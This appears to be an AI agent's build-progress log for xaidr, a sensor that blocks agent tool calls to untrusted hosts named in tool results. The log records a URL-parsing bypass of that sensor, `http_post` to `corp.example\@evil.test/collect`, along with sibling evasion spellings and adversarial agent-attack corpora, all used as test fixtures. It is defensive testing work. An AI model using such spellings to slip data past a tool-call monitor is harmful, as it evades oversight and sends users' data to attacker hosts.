# A2 — value-origin seam wiring: PROGRESS

Evidence goes here as the build runs, and failures are reported as failures.
Plan: `ARCHITECTURE.md`; brief: `BRIEF.md`; rulings: `docs/value-origin-rulings.md`.

How every run below was made, unless a line says otherwise:

- **macOS** (Darwin 25.6), CPython 3.12.2, in a scratch venv carrying pytest,
  httpx 0.28.1, urllib3 2.8.0, ada-url 4.0.0 and hatchling. The run uses
  `PYTHONPATH=<worktree>`, and `xaidr.__file__` was confirmed to be the worktree
  (memory: xaidr-worktree-venv-shadowing). The shared `.venv` was not used for
  these runs.
- **Linux:** `python:3.10-slim` (CPython 3.10.21) and `python:3.12-slim`
  (3.12.14). Each container copies the tree and runs `pip install '.[dev]'`.
- **Affected tests only.** The full suite was never run.

---

## M0 — finding 1, the backslash-userinfo authorization bypass (Q1). **Green. STOP AND REPORT.**

**STOP 2 / the owner's M0 STOP:** ENFORCE (M8) does not start until the owner
has seen this. The build continues with C-11 (M1), which does not depend on it.

**Commits.**
- Plan: `2f93115` (ARCHITECTURE.md).
- **M0 core change: `77ee2f8eea0c82804b403d180bc754e14af4b30d`, the new pin
  for paid**, in its own commit, as instructed. It is SEMANTIC:
  `expected.jsonl` moved, so paid's re-vendor bumps `EVALUATOR_GENERATION`
  (P4). It is not on `main`, so `vendor_value_origin.py`'s ancestry check
  refuses it until it is merged. Merging is the owner's call.
- Evidence: the commit after this one.

**The defect.** With `evil.test` recorded untrusted,
`http_post(url="https://corp.example\@evil.test/collect")` came back
**`principal`, AUTHORIZED, not blocked under ENFORCE**. The core read only the
WHATWG split (backslash is a slash: `corp.example`); httpx sends the request
to `evil.test`, and `urllib.parse` reads `evil.test` as its host. (Corrected at
review: an earlier draft said "httpx and urllib send". `urllib.request` passes
the raw netloc on and reaches neither host.) This is the 1.15.0 userinfo bypass shape in new code.

**The fix (Q1, amends V-23).** Every reading of the authority split that a real
consumer performs is a finding, and the weakest decides. That is R1's shape.
In `xaidr/value_origin/_authority.py`:

- **WHATWG reading:** via `urlsplit`, as before.
- **RFC 3986 reading:** urllib.parse and httpx, computed on the value as
  written.
- **Refused WHATWG string:** where `urlsplit` refuses it, the value stays
  `parse_failure` (decision 7), and the WHATWG host the split still finds is
  added beside it.

The RFC and refusal readings use a written-out split, because `urlsplit`
differs across CPython patch releases (V-4).

### Failing test first — the red, before any core change

The conformance rows (`supplementary.jsonl`, through `convert.py`, so
`expected.jsonl` and SOURCE.json were regenerated, not hand-edited), the
ENFORCE pins, the result-side test, and the multi-oracle differential, all run
against the unfixed core:

```
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[V23-backslash]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-userinfo-bypass]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-userinfo-mirror]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-nonspecial-scheme]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-nonspecial-scheme]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-userinfo-bypass]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_poisoned_result_records_every_reading_of_its_url
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys0]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys1]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_37chars-keys2]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_authority_of_answers_none_for_a_value_with_two_authorities
11 failed, 9 passed, 137 deselected in 0.07s

E  AssertionError: Q1-backslash-userinfo-bypass: should_block under ENFORCE is False (wire principal), Q1 says True —
   a call httpx/urllib send to an UNTRUSTED host walked through because the core read only the other side of the backslash
E  AssertionError: 3703 readings name a host the core never reads ({'urllib.parse': 1705, 'httpx': 1674, 'ada-url (WHATWG)': 324}):
   a call the transport sends there is invisible to value origin, and under ENFORCE an untrusted host walks through.
   First five: 'http://corp.example\\@evil.test' urllib.parse reads dns:evil.test, core reads ['dns:corp.example']; ...
FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
```

### Two more defects found while proving it, each red first

1. **V-4: `urlsplit` is not the same function on every interpreter.** The first
   fix computed the RFC reading with `urlsplit`. In the Linux containers that
   gave 336 under-reads (httpx 288, ada 48), for example
   `http://[::1]\@evil.test`. Its bracketed-host validation, a security
   backport, raises there on 3.10.21 and 3.12.14 and returns `evil.test` on
   3.12.2, while httpx sends it to `evil.test` everywhere. Fixed with a
   written-out split. The pin, red with the `urlsplit` version on Linux:
   ```
   == previous RFC split, py3.10
   FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://[::1]\\@evil.test/x-keys6]
   FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
   == previous RFC split, py3.12   (same two)
   ```
2. **A sibling of finding 1, found by the adversarial corpus.**
   `http://&a:foo(b]c@d:2/` from WPT goes to `d` through httpx, urllib3 and
   WHATWG. `urlsplit` refuses it, so the core read nothing (`parse_failure`
   alone never blocks). Spellings of that shape were added to the grid first:
   ```
   E  AssertionError: 6993 readings name a host the core never reads ({'httpx': 864, 'urllib3': 945, 'ada-url (WHATWG)': 5184})
   ```
   The new pins were red against the previous fix:
   ```
   FAILED ...test_supplementary_case[Q1-urlsplit-refusal]
   FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-urlsplit-refusal]
   FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://&a:foo(b]c@d:2/-keys7]
   FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
   4 failed, 232 passed, 7 xfailed
   ```
3. **Over-reads.** These were caught by the over-read gate after the
   silent-failure review asked for `[` mid-host spellings:
   - 3,150 over-reads from reading past a mid-host `[` (`http:ev[il].test` read
     as `il`);
   - then 42 under-reads on 3.12.2, where `urlsplit` does read `il` from
     `http://[::1]\@ev[il].test`;
   - then 1,575 over-reads of bracketed non-IPv6 hosts (`http:[evil.test]`).

   **Then the milestone review.** The over-read class's stated reason was
   false ("an older `urllib.request` sends there"), and on macOS the class was
   absorbing 1,092 over-reads that even 3.12.2 refuses. Resolved by making the
   RFC reading reproduce **exactly** CPython 3.12.2's `urlsplit` checks and host
   rule, the most permissive version measured. The WHATWG fallback uses
   WHATWG's rule: a `[` must open the host and enclose IPv6. The class is now
   pinned both ways:
   - it absorbs **0** on 3.12.2, because urllib.parse there reads every host the
     core reads;
   - it absorbs **115** on 3.10.21 and 3.12.14, which refuse them.

### Green — the final code, three interpreters

The affected suites are `tests/value_origin_conformance/`,
`tests/test_differential_oracles.py`, `tests/test_differential_parsers.py`,
`tests/test_url_classes.py` and `tests/outside/`:

```
== macOS 3.12.2
499 passed, 12 xfailed in 21.01s
== linux 3.10
499 passed, 12 xfailed in 15.02s
== linux 3.12
499 passed, 12 xfailed in 10.93s
```

Counts on the committed differential corpus
(`scratchpad/count_grid.py`):

```
pre-fix core (base 25dc9de), macOS:  spellings=47124 under_reads=10780 {'urllib.parse': 1789, 'httpx': 2538, 'urllib3': 945, 'ada-url (WHATWG)': 5508}
M0 core, macOS py3.12.2:             spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=0    unnamed_over_reads=0
M0 core, linux py3.10.21:            spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=115  unnamed_over_reads=0
M0 core, linux py3.12.14:            spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=115  unnamed_over_reads=0
```

The 12 xfails are strict. There are 11 pre-existing ones, plus
`test_residual_empty_hex_part_is_the_zero_address`, found below. On Linux the
`dev` extra installs on both 3.10 and 3.12, so nothing skips.

### Sabotage proof, on the final code, both directions

Run on the commit candidate. Every Q1 reading is removed (`others = []` in
`url_authority`):

```
=== SABOTAGE on final M0 code: every Q1 reading removed — new gates
E  AssertionError: 10780 readings name a host the core never reads ({'urllib.parse': 1789, 'httpx': 2538, 'urllib3': 945, 'ada-url (WHATWG)': 5508}): ...
FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
FAILED ...test_supplementary_case[V23-backslash]
FAILED ...test_supplementary_case[Q1-backslash-userinfo-bypass]
FAILED ...test_supplementary_case[Q1-backslash-userinfo-mirror]
FAILED ...test_supplementary_case[Q1-backslash-nonspecial-scheme]
FAILED ...test_supplementary_case[Q1-urlsplit-refusal]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-nonspecial-scheme]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-userinfo-bypass]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-urlsplit-refusal]
FAILED ...test_q1_a_poisoned_result_records_every_reading_of_its_url
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys0]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys1]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_37chars-keys2]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://[::1]\\@evil.test/x-keys6]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://&a:foo(b]c@d:2/-keys7]
FAILED ...test_q1_authority_of_answers_none_for_a_value_with_two_authorities
16 failed, 221 passed, 8 xfailed
=== same sabotage — the gates that existed before M0 (must stay green)
128 passed, 4 xfailed
=== RESTORED (byte-identical)
237 passed, 8 xfailed
```

**The discriminating half.** Under the same sabotage, the gates that existed
before M0 stay green, which is why they never saw finding 1:

- `test_v19_every_spelling_resolves_to_the_host_urllib_parse_finds`, with one
  oracle and an already-normalised URL fed to it;
- `tests/test_differential_parsers.py`;
- `tests/test_url_classes.py`.

### Outside the process: built wheel, fresh venv, `python -I`, base against HEAD

`tests/outside/harness.py` imports no `xaidr`. The driver refuses unless
`xaidr` comes from the venv's site-packages. httpx was installed in each venv
to show where the transport sends the same string.

```
=== base: wheel from git archive 25dc9de (A1 merge)
  xaidr from out-base/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  benign-one-authority   wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=docs.corp.example
  bypass                 wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=evil.test
  mirror                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=corp.example
  plain-untrusted        wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=evil.test
=== head: wheel from the M0 working tree
  xaidr from out-head/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  benign-one-authority   wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=docs.corp.example
  bypass                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:corp.example', 'dns:evil.test']  httpx_sends_to=evil.test
  mirror                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test', 'dns:corp.example']  httpx_sends_to=corp.example
  plain-untrusted        wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=evil.test
```

`tests/outside/test_m0_reading_set_from_the_wheel.py` asserts the HEAD half in
CI's `full` config. The base half is one-off evidence: CI checks out with depth
1, so the base commit is not there to build.

**Scope of "end to end".** No sensor seam is wired yet, so the end-to-end path
in M0 is the core's public interface, which paid vendors, exercised from the
installed wheel. The same flow through `Sensor.scan_tool_call` becomes
observable at M4. It is deferred by construction, not skipped.

### Adversarial verification: a corpus the build never saw

The corpus is web-platform-tests `url/resources/urltestdata.json` at
`c48d58747e1f211527fb695fd60548a997fae617` (sha256 `81e85fd3…f652`,
BSD-3-Clause). It was fetched to the scratchpad and not vendored; vendoring
comes with M2 (Q19). It ran through the same four oracles, 696 absolute inputs.
Every remaining under-read falls in a named class, and **none is a split
defect**:

```
WPT under-reads after M0, by class (oracle readings):
    71  whitespace/control: known residual (strict xfail)   e.g. 'http://example\t.\norg'
    66  file:/data: ruled never a destination (decision 6)   e.g. 'file://example:1/'
    49  relative / scheme-less reference: not a sendable URL (V-19)   e.g. '//foo/bar'
     9  mailto:// authority: not a fetchable scheme   e.g. 'mailto://example.com:8080/pathname?search#hash'
     2  empty-hex IP part: new strict xfail (integer family)   e.g. 'https://0x.0x.0'
```

### Q3: refuse, never skip

The `base` install has no dev extra:

```
--- base install, oracle tests run directly (must REFUSE, not skip):
      6 errors
      3 REFUSING: hatchling (dev extra) is not installed, so no wheel can be built ...
      3 REFUSING: oracle(s) ['httpx', 'urllib3', 'ada-url'] are not installed, so this differential cannot compare ...
--- base install, as CI base runs them (explicit deselect):
364 passed, 1 skipped, 6 deselected, 8 xfailed
```

The one skip is the existing `test_built_wheel` (no hatchling in `base`). It
predates A2, and the new tests do not repeat its pattern.

### Found, not fixed (strict xfail, pasted red on adoption)

- **Empty hex part.** `https://0x.0x.0/` is 0.0.0.0 to WHATWG (ada) and to the
  macOS libc resolver that httpx and urllib3 hand the name to. glibc does not
  read it that way. The core reads `dns:0x.0`, because `int("0x", 16)` raises in
  `coerce_ip`. This is IP canonicalisation in the integer family, and it is
  fixed where `coerce_ip` is shared (M3). It is not a Q1 split question.

### Decisions this milestone made that need the owner's ruling

All are recorded in `docs/value-origin-rulings.md`, under "Decisions made in
the A2 build (M0)":

1. The RFC 3986 reading is a written-out split that reproduces CPython 3.12.2's
   `urlsplit`, not this interpreter's `urlsplit` (V-4, measured). The WHATWG
   fallback uses WHATWG's bracket rule.
2. A value `urlsplit` refuses stays `parse_failure` and carries the hosts the
   other readings find. That is Q1 applied to a refusal, found by WPT.
3. `authority_of` returns `None` for a value with two authorities, as for a
   two-mailbox list.
4. Over-read class `urlsplit-bracket-validation`: hosts 3.12.2's
   urllib.parse reads and later patch releases refuse. It absorbs 0 on 3.12.2
   and 115 on 3.10.21 / 3.12.14, and is pinned both ways.

### What changed outside `xaidr/value_origin/`

- `pyproject.toml`: the `dev` extra gains `httpx`, `urllib3` and `ada-url`.
  These are test oracles, not runtime dependencies (Q3).
- `.github/workflows/ci.yml`: `base` runs `-m "not requires_dev_extra"`;
  `full` runs everything.
- `tests/conftest.py`: registers the `requires_dev_extra` marker.
- `expected.jsonl` changed, which is **semantic** for paid (§4.5, P4):
  - +5 rows: `Q1-backslash-userinfo-bypass`, `-mirror`,
    `-nonspecial-scheme`, `-readings-agree`, `Q1-urlsplit-refusal`;
  - `V23-backslash`'s findings gained `dns:corp.example` (principal). Its wire
    is still `unresolved`.
  - Paid's re-vendor must bump `EVALUATOR_GENERATION`.

### Fresh-context reviews

- **silent-failure-hunter.** No swallowed exception or empty-default fallback
  in the diff. Everything it ran was confirmed: the merge, the refuse
  behaviour, the outside harness, and the regenerated data, which only adds
  findings. It flagged one corpus gap: a `[` mid-host was never generated. That
  is now in the grid, and it exposed the over-read and under-read pair above,
  now fixed. Its specific example `https://user@corp.ex[ample]:8080/x` is read
  as `ample` by the RFC reading, and every current `urlsplit` refuses it, so it
  falls in the named class.
- **milestone-reviewer.** Five of six claims held. It ran the HEAD and fixed
  cores side by side, the refusal, the outside driver's refusal and the
  `convert.py` byte-identity. It found:
  1. **False:** "httpx and urllib send it to evil.test". urllib.request
     passes the raw netloc; only urllib.parse reads evil.test. **Retracted in
     place** in `docs/value-origin-rulings.md` and the ARCHITECTURE.md F1 row
     and §2.3, and corrected in every test message, docstring and conformance
     rule text that said it. The grep comes back clean.
  2. **Not reproducible:** "3,703 under-reads across 31,752 spellings" came
     from the first grid. The committed corpus is 47,124 spellings, with 10,780
     under-reads pre-fix (pasted above). Retracted in place.
  3. **Wrong:** decision 4's "31 spellings, Linux only", and its reason. Fixed
     as above. The reviewer's own "macOS absorbs none" was also not what I
     measured: 1,092 then, 0 now.
  4. **Stale:** the rulings doc predated the bracket-rule change. Updated.

  The reviewer also noted the tree changed while it was reviewing. Every number
  in this file comes from the final commit candidate (`_authority.py`
  re-checked after the last edit).

---

## M1 — the C-11 gate, "RECORD never changes an action". **Green. STOP AND REPORT (BRIEF: before any seam wiring).**

**What was built.**
- `tests/test_value_origin_c11.py`: OFF against RECORD in `block` and
  `monitor` enforcement.
- `tests/outside/drivers/c11_oracle.py`: the passes as one module. The
  in-tree gate imports it, and it runs as a driver against built wheels, with
  `--base` for a wheel that predates the parameter and `--compare` for the
  cross-commit table.
- `tests/outside/test_m1_c11_from_the_wheel.py`: C-11 and the construction
  checks asserted in the built wheel (CI `full`).
- **Inert, loudly validated** `Sensor(value_origin="record",
  value_origin_sources=())` (V-34). Nothing reads either parameter yet. ENFORCE
  logs exactly ONE warning, saying what is true: value origin is **NOT YET
  WIRED**, so `enforce` changes no action today, and, with no designations,
  every destination a tool result names will be blocked once it enforces
  (C-11). Default, OFF and RECORD log nothing.

**The passes.** Main corpus, the 456 shell rows:

| pass | what it drives |
|---|---|
| P-input | byte-for-byte the existing oracle, computed by its own `_digest` |
| P-flow-I | T as principal input, then the calls built from T |
| P-flow-R | a neutral input, T as a tool result, then the calls |
| P-seam | T as a `protect_tools`-wrapped tool's return value |
| P-fault | circuit-open, gate, bounds fail-closed, scan-error and not-scannable exits, each one's marker counted |

The §3.3 adversarial corpora, which the gate was not built on:

| pass | what it drives |
|---|---|
| A-flow-I | heldout 100 prompts plus asi_battery 128 text rows, as principal input |
| A-flow-R | the same 228 texts as tool results |
| A-calls | benign_toolcalls 410 calls plus asi_battery 60 tool rows, arguments verbatim |
| A-steps | asi_battery's 52 multi-turn rows, 105 steps, replayed in one flow each |

Every one of asi_battery's 240 rows is driven by exactly one pass.

**What P-seam does NOT cover yet (corrected after the M1 review).**
`protect_tools` has no result position (ARCHITECTURE.md §1.2), so at M1 P-seam
covers **no** result seam: its digest is the same whatever the tool returns. M7
gives `protect_tools` its result position and adds the `langchain_core` and MCP
after-hooks. That is now written into M7's build list, not only here.

### Failing first

Before the constructor change:

```
16 failed, 5 xfailed in 0.30s
E   TypeError: DelphiSensor.__init__() got an unexpected keyword argument 'value_origin'   (x15)
```

The strict xfails had "passed" on that TypeError, which is the wrong reason.
All of them are now `raises=AssertionError`.

### Honest reds on the way (each corrected where it was asserted)

- **The call denominator** was first written as `>= 39`, from a scratch script.
  `calls_for()` gives `{'run_command': 456, 'http_post': 36, 'send_email': 2}`,
  now pinned exactly. ARCHITECTURE.md §3.2 is retracted in place.
- **asi_battery** was assumed to have 56 tool rows per file. That was the count
  WITHOUT `text`. It actually has three shapes: 64 text, 30 tool and 26
  multi-turn rows. The loader crashed (`KeyError: 'text'`) and then counted
  470 against a pinned 522. Both counts are now measured and pinned, and the
  multi-turn rows got their own pass instead of being skipped.

### Green: four interpreters

The suites are C-11, the 456-row oracle, `tests/outside/`, the conformance
suite and the multi-oracle differential:

```
== macOS 3.12.2      425 passed, 14 xfailed, 1 warning
== linux 3.10        425 passed, 14 xfailed
== linux 3.11        425 passed, 14 xfailed
== linux 3.12        425 passed, 14 xfailed
```

The one macOS warning did not recur when re-run with `-W
error::pytest.PytestWarning` (`425 passed, 14 xfailed`). It is recorded as
observed once, not reproduced.

The C-11 strict xfails (6 of the 14; the rest are the core's pre-existing
strict xfails) state the gate's vacuity:

```
XFAIL test_4a_I_..._input_derived_calls                      - not wired: RECORD records no input until M6
XFAIL test_4a_R_..._result_derived_calls[P-flow-R]            - not wired: RECORD records no tool result until M7
XFAIL test_4a_R_..._result_derived_calls[P-seam]              - not wired: RECORD records no tool result until M7
XFAIL test_4b_enforce_moves_an_action_...[P-flow-I|P-flow-R|P-seam] - not wired: nothing can block until M8
```

4a-R is one assertion per pass, because the public `scan(tool_result)` alone
would flip a pooled count at M7 (the M1 review).

### Sabotage, on the final code

```
=== SABOTAGE A: inert RECORD appends a rule on the INPUT path
FAILED ...test_record_moves_no_verdict_score_or_rule[P-input-block]
FAILED ...test_record_moves_no_verdict_score_or_rule[P-input-monitor]
FAILED ...test_record_moves_no_action_on_the_adversarial_corpora[A-steps-block]
FAILED ...test_record_moves_no_action_on_the_adversarial_corpora[A-steps-monitor]
4 failed, 15 passed, 16 deselected
--- existing 456-row oracle (must stay green):
4 passed
=== SABOTAGE B: inert RECORD flags allowed TOOL CALLS
FAILED ...[P-flow-I-block] [P-flow-I-monitor] [P-flow-R-block] [P-flow-R-monitor]
FAILED ...[P-seam-block] [P-seam-monitor] [P-fault-block] [P-fault-monitor]
FAILED ...adversarial_corpora[A-flow-I-block] [A-flow-I-monitor] [A-flow-R-block] [A-flow-R-monitor]
FAILED ...adversarial_corpora[A-calls-block] [A-calls-monitor] [A-steps-block] [A-steps-monitor]
16 failed, 3 passed, 16 deselected
--- existing 456-row oracle (must stay green):
4 passed
=== SABOTAGE C: the warning fires on EVERY construction (the M1 reviewer's probe)
FAILED ...test_construction_warns_only_for_enforce_and_says_what_is_true[kwargs0-0]
FAILED ...test_construction_warns_only_for_enforce_and_says_what_is_true[kwargs1-0]
FAILED ...test_construction_warns_only_for_enforce_and_says_what_is_true[kwargs2-0]
3 failed, 2 passed, 30 deselected
=== RESTORED (byte-identical)
33 passed, 6 xfailed
```

- **The discriminating half of A and B:** the existing oracle stays green. It
  never calls `scan_tool_call` (F4), and both of its sensors run the default
  mode, so a RECORD regression moves them equally.
- **Sabotage C** is the gap the milestone reviewer demonstrated: the first
  version of the warning test stayed green under it. It is now red.

### Outside the process, across commits

See the next section: it is run on the COMMITTED M1 tree, so the evidence
names a SHA.

### Fresh-context reviews

- **silent-failure-hunter:** nothing silent found. It ran checks rather than
  reading code:
  - the strict xfails fail for the right reason (`--runxfail`);
  - the call count;
  - the raise order is preserved;
  - `protect()` forwards the new keywords, because its accepted set comes from
    `inspect.signature`;
  - there is no state leak in either file order, alongside the conformance and
    `protect` suites;
  - the breaker really stays open;
  - the driver's refusals return non-zero.
- **milestone-reviewer:** it reproduced every central claim: P-input equals
  the real `_digest`, failing first, both sabotages, and identical
  cross-commit digests. It found the following, all fixed and re-verified
  above:
  1. the warning had no must-stay-quiet test, and its text claimed blocking
     while inert;
  2. P-input was compared against a hand copy of the oracle, not the oracle's
     own function;
  3. 4a-R was pooled;
  4. the P-seam deferral was understated, and absent from M7's build list;
  5. a nonexistent `scripts/c11_oracle.py` was named in the plan;
  6. the §3.3 adversarial re-run was silently dropped;
  7. the outside "`enforec` raises" check was missing;
  8. the cross-commit table came from an uncommitted tree and a scratchpad
     script;
  9. PROGRESS.md said C-11 runs in "the full config only". The in-tree gate
     has no marker, so it runs in BOTH configs, about 15 to 25 s per Python;
     only the outside test is `full`-only.

### What C-11 does NOT yet prove

Nothing is wired, so **RECORD ≡ OFF holds because RECORD does nothing yet**.
The six strict xfails say so. What M1 establishes is:
1. the instrument, with every pass and every fault path reached;
2. the baseline, identical across commits from the built wheel;
3. that the gate catches a RECORD regression on the input path, on the tool
   path, across turns, and on corpora it was not built on, none of which the
   existing oracle can see.

### CI

CI did not run. It triggers on `pull_request` and on pushes to `main`, the
instruction is to push the branch only, and no PR was opened.

### M1 outside the process, across commits, pinned to SHAs

Wheels were built from `git archive 25dc9de` (base) and `git archive a4df0e6`
(the M1 commit), each in a fresh venv, using the committed harness and driver:

```
$ git archive a4df0e6 | tar -x -C m1-tree    # and base-tree from git archive 25dc9de
$ python -I m1-tree/tests/outside/harness.py base-tree c11-base c11_oracle.py -- --base > c11_base.json
  exit 0
$ python -I m1-tree/tests/outside/harness.py m1-tree c11-head c11_oracle.py > c11_head.json
  exit 0
$ python m1-tree/tests/outside/drivers/c11_oracle.py --compare c11_base.json c11_head.json
base xaidr: c11-base/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
head xaidr: c11-head/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  block   A-calls    base=da99beb148b8 off=da99beb148b8 record=da99beb148b8 enforce=da99beb148b8  IDENTICAL
  block   A-flow-I   base=b8088580c868 off=b8088580c868 record=b8088580c868 enforce=b8088580c868  IDENTICAL
  block   A-flow-R   base=e30d17b1bbbc off=e30d17b1bbbc record=e30d17b1bbbc enforce=e30d17b1bbbc  IDENTICAL
  block   A-steps    base=bb062c8e336d off=bb062c8e336d record=bb062c8e336d enforce=bb062c8e336d  IDENTICAL
  block   P-fault    base=0cab68adc932 off=0cab68adc932 record=0cab68adc932 enforce=0cab68adc932  IDENTICAL
  block   P-flow-I   base=0d89307249ea off=0d89307249ea record=0d89307249ea enforce=0d89307249ea  IDENTICAL
  block   P-flow-R   base=bc8f93094a59 off=bc8f93094a59 record=bc8f93094a59 enforce=bc8f93094a59  IDENTICAL
  block   P-input    base=80f31ff0b5d5 off=80f31ff0b5d5 record=80f31ff0b5d5 enforce=80f31ff0b5d5  IDENTICAL
  block   P-seam     base=c0c7b885462b off=c0c7b885462b record=c0c7b885462b enforce=c0c7b885462b  IDENTICAL
  monitor A-calls    base=bc96eee1be21 off=bc96eee1be21 record=bc96eee1be21 enforce=bc96eee1be21  IDENTICAL
  monitor A-flow-I   base=b8088580c868 off=b8088580c868 record=b8088580c868 enforce=b8088580c868  IDENTICAL
  monitor A-flow-R   base=e30d17b1bbbc off=e30d17b1bbbc record=e30d17b1bbbc enforce=e30d17b1bbbc  IDENTICAL
  monitor A-steps    base=8cc17aa1d456 off=8cc17aa1d456 record=8cc17aa1d456 enforce=8cc17aa1d456  IDENTICAL
  monitor P-fault    base=f5a1cdb40a4f off=f5a1cdb40a4f record=f5a1cdb40a4f enforce=f5a1cdb40a4f  IDENTICAL
  monitor P-flow-I   base=dfc965d823fd off=dfc965d823fd record=dfc965d823fd enforce=dfc965d823fd  IDENTICAL
  monitor P-flow-R   base=f7a15b56474d off=f7a15b56474d record=f7a15b56474d enforce=f7a15b56474d  IDENTICAL
  monitor P-input    base=51e3814f8b8d off=51e3814f8b8d record=51e3814f8b8d enforce=51e3814f8b8d  IDENTICAL
  monitor P-seam     base=b48742e05acc off=b48742e05acc record=b48742e05acc enforce=b48742e05acc  IDENTICAL
cross-commit: all identical
  exit 0
--- construction checks from the a4df0e6 wheel:
  enforec_rejected: value_origin mode: expected one of ['off', 'record', 'enforce'], got 'enforec'
  warnings: {'default': 0, 'enforce': 1, 'enforce+designation': 1, 'off': 0, 'record': 0}
```

`80f31ff0…` (P-input, block) is the oracle digest `docs/enterprise-seams-design.md`
recorded for earlier seams.

---

## Status after M1, and what is waiting on the owner

| milestone | state | commit |
|---|---|---|
| M0: finding 1 (Q1) | green, **STOP AND REPORT** | `77ee2f8` (the new paid pin, SEMANTIC) |
| M1: the C-11 gate | green, **STOP AND REPORT** | `a4df0e6` |
| M2 / M3: url_parse differential + move | next; does not depend on either STOP | — |
| M4–M7: seam wiring | **held**: the BRIEF STOPs before any seam wiring until the owner has seen C-11 | — |
| M8: ENFORCE | **held**: needs the owner's review of M0, plus STOP 3 (vocabulary) | — |
| M9: wire field | held at STOP 4 (wire format) | — |
| M10 / M11 | after the above | — |

**Waiting on the owner:**
1. Review M0, which unblocks ENFORCE (M8).
2. Review C-11 (M1), which unblocks the seam wiring (M4–M7).
3. Rule on the four M0 build decisions in `docs/value-origin-rulings.md`
   ("Decisions made in the A2 build (M0) that still need a ruling").
4. M0 changed `expected.jsonl`. It is a semantic change for paid (P4), and pin
   `77ee2f8` vendors only once it is on `main`.

**Not verified:**
- CI has not run on this branch. It triggers on `pull_request` and on pushes to
  `main`, and no PR was opened.
- The `ci.yml` marker change was exercised locally in `python:3.12-slim`, not on
  GitHub runners.
